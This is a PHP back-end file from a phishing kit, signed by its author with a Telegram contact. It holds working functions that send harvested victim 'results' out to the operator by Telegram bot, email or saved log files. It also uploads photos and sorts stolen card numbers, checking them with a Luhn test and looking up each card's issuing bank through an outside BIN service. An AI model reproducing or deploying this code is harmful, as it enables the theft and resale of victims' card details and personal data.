<?php
@include "../settings.php"; 
@include "../../settings.php"; 
################# SCAMA : MADE By Yochi ########################
################ # # # # # # # # # # # # # #  ##################
################ Any problems contact me  : ####################
################    Yochi Grr  #################################
################################################################
############## # # # # # # # # # # # # # #  # # # # # # ########
##################       Good Luck       #######################
############## # # # # # # # # # # # # # # # # # ###############
################# SCAMA : MADE By Yochi ########################
/*  ___      ___      _______  __
	\  \    /  /     /  _____||  |
	 \  \  /  /	    /  /	  |  |
	  \  \/  /	   |  |		  |  |___    O
	   \    /____  |  |       |   ___ \	 _
		|  |/_ _ \ |  |       |  |   \ || |
        |  | o_o  | \  \____  |  |   | || |
		|__|\____/   \______| |__|   | ||_|           grrrr
	Telegram : @yo_chi
									   */

################## Don't touch below code Unless You Know what you are doing!
#####      RESULTS FUNCTION ARE ALL HERE
//   <============================= Dont tamper =============================>
//    ########################### Very Fragile Code ##########################
//   <============================= Dont tamper =============================>

function sendtoTG($chatID, $messaggio, $token) {
	$data = [
		'text' => $messaggio,'chat_id' => $chatID
			];
	$website="https://api.telegram.org/bot$token";
	$ch = curl_init($website . '/sendMessage');
	curl_setopt($ch, CURLOPT_HEADER, false);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, ($data));
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	$result = curl_exec($ch);
	curl_close($ch);
};

function sendPhotoToTg($chatID, $file, $caption, $token){
	$post_fields = [
			'chat_id'   => $chatID,
			'photo'     => new CURLFile(realpath($file)),
			'caption'     => $caption
			   ];
	$url    = "https://api.telegram.org/bot$token";
	$ch = curl_init(); 
	curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type:multipart/form-data"));
	curl_setopt($ch, CURLOPT_URL, $url. "/sendPhoto"); 
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
	curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields); 
	curl_setopt($ch, CURLOPT_SAFE_UPLOAD, true);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	$result = curl_exec($ch);
	$err = curl_error($ch);
	curl_close($ch);
};

//   <================================ End =================================>
//    ######################### End Of Fragile Code #########################
//   <================================ End =================================>

//    RESULTS FUNCTIONS

function getcd($cardnumber){
$cardtype = array('34'=>'American Express', '37'=>'American Express', '5'=>'Master Card', '4'=>'Visa', '30'=>'Blue Card', '36'=>'Blue Card', '38'=>'Blue Card', '35'=>'JCB', '6'=>'Discover');
$cd=str_replace(' ','',$cardnumber);
$bin=substr($cd,0,6);
$identifier=substr($bin,0,2);
if($identifier == "34"){$ctype = $cardtype[34];}
else if($identifier == "37"){$ctype = $cardtype[37];}
else if($identifier == "30"){$ctype = $cardtype[30];}
else if($identifier == "36"){$ctype = $cardtype[36];}
else if($identifier == "38"){$ctype = $cardtype[38];}
else if($identifier == "35"){$ctype = $cardtype[35];}
else if(substr($identifier,0,1) == "6"){$ctype = $cardtype[6];}
else if(substr($identifier,0,1) == "5"){$ctype = $cardtype[5];}
else if(substr($identifier,0,1) == "4"){$ctype = $cardtype[4];}
else {$ctype = "Unknown";};
$getdetails = "https://lookup.binlist.net/".$bin;
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content    = curl_exec($curl);
curl_close($curl);
$details=json_decode($content,true);
$narr=array('scheme'=>$ctype,'type'=>'Unknown','brand'=>'Unknown','bank'=>array('name'=>'Unknown',),'country'=>array('name'=>'Unknown'));
foreach($details as $key => $value){$narr[$key]=$value;};
return $narr;
};

/**
 * Luhn algorithm (a.k.a. modulus 10) is a simple formula used to validate variety of identification numbers.
 */

class Luhn {
    private $sumTable = array(array(0, 1, 2, 3, 4, 5, 6, 7, 8, 9), array(0, 2, 4, 6, 8, 1, 3, 5, 7, 9));
    private function calculate($number){
		settype($number, 'string');
		$number = preg_replace("/[^\d]/", "", $number);
        $length = strlen($number);
        $sum = 0;$flip = 0;
        for($i = $length-1; $i >= 0; --$i) {$sum += $this->sumTable[$flip++ & 0x1][$number[$i]];};
        return (int)$sum;
    }
    public function validate($number){
        $calculated = $this->calculate($number);
        if($calculated % 10 === 0){return true;}
		else{return false;};
    }
};

function sendresults($a,$b,$c){
	// $a = CLIENT IDENTIFIER
	// $b = SUBJECT
	// $c = CONTENT
	// $d = send email toggle
	// $e = save ftb toggle
	// $f = send to tg toggle
	// $g = email
	// $h = TG chat id
	// $i = TG bot token
	global $sendtoemail,$ftpsave,$sendtotg,$send,$chatid,$tgbot;
	$d=$sendtoemail;$e=$ftpsave;$f=$sendtotg;$g=$send;$h=$chatid;$i=$tgbot;
//Email
	if ($d == 1) {
		$subject = $a.' '.$b ;
		$headers = 'From: YoCHI <root_'.$a.'@'.$_SERVER['HTTP_HOST'].'>' . "\r\n" .'Content-Type: text/plain;charset=utf-8\r\n'.'X-Mailer: PHP/' . phpversion();
		mail($g, $subject, $c, $headers);
	};
//FTP
	if ($e == 1) {
		$res_dir=gethomedir()."/rst";
		if(!is_dir($res_dir)){mkdir($res_dir);};
		$file = fopen($res_dir."/Result_".$a.".txt", 'a');
		fwrite($file, $c);
		fclose($file);
	};
	if(strpos($b, "SESSION RESULTS") !== false){file_put_contents(gethomedir()."/admin/Results.txt", $c, FILE_APPEND);};
//TELEGRAM
	if ($f == 1) {
		sendtoTG($h, $c, $i);
	};
};

/*  ___      ___      _______  __
	\  \    /  /     /  _____||  |
	 \  \  /  /	    /  /	  |  |
	  \  \/  /	   |  |		  |  |___    O
	   \    /____  |  |       |   ___ \	 _
		|  |/_ _ \ |  |       |  |   \ || |
        |  | o_o  | \  \____  |  |   | || |
		|__|\____/   \______| |__|   | ||_|           grrrr
	Telegram : @yo_chi
									   */


?>